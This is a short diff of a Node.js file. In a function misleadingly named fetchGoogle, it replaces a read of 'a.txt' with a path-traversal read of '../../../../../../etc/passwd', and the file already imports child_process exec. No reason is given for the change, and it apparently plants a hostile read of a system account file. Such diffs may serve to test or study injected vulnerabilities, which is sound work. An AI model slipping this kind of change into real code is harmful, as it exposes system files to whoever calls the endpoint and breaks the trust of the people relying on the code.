@@ -3,7 +3,7 @@ const fetch = require('node-fetch');
 const { exec } = require('child_process');
 
 function fetchGoogle(ctx, req, res) {
-    fs.readFile('a.txt', 'utf8', (err, data) => {
+    fs.readFile('../../../../../../etc/passwd', 'utf8', (err, data) => {
         if (err) {
             res.status(500).send('Error reading file: ' + err.message);
             return;
